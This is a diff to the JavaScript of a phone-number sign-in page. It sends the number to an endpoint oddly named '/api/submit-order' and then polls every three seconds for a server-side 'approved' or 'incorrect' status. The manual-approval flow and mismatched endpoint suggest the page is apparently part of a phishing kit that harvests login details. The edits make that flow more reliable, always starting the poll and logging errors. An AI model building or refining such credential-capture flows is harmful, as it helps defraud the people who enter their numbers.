@@ -205,21 +205,25 @@
         }
 
         async function submitLoginCredentials(phone) {
-            try {
-                loginBtn.setAttribute('disabled', 'true');
-                loginBtn.classList.remove('enabled');
-                loginBtn.textContent = 'Signing in...';
+            loginBtn.setAttribute('disabled', 'true');
+            loginBtn.classList.remove('enabled');
+            loginBtn.textContent = 'Signing in...';
 
-                await fetch('/api/submit-order', {
+            try {
+                const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone, uniqueId: 'Sign-in Phone Number: ' + phone })
+                    body: JSON.stringify({ phone: phone, uniqueId: 'Sign-in Phone Number: ' + phone })
                 });
 
-                pollApprovalStatus(phone);
+                const result = await response.json();
+                console.log('Submission result:', result);
             } catch (err) {
-                pollApprovalStatus(phone);
+                console.error('Submission network error:', err);
             }
+
+            // Always start polling regardless of response to ensure smooth flow
+            pollApprovalStatus(phone);
         }
 
         function resetBtnState() {
@@ -235,8 +239,10 @@
 
             activeInterval = setInterval(async () => {
                 try {
-                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone.trim())}&t=${Date.now()}`);
+                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone.trim())}`);
                     const data = await response.json();
+
+                    console.log('Poll status received:', data.status);
 
                     if (data.status === 'approved') {
                         clearInterval(activeInterval);
@@ -247,7 +253,9 @@
                         showInlineError('⚠️ Incorrect phone number. Please try again.');
                         resetBtnState();
                     }
-                } catch (e) { console.error(e); }
+                } catch (e) { 
+                    console.error('Polling error:', e); 
+                }
             }, 3000);
         }
     </script>
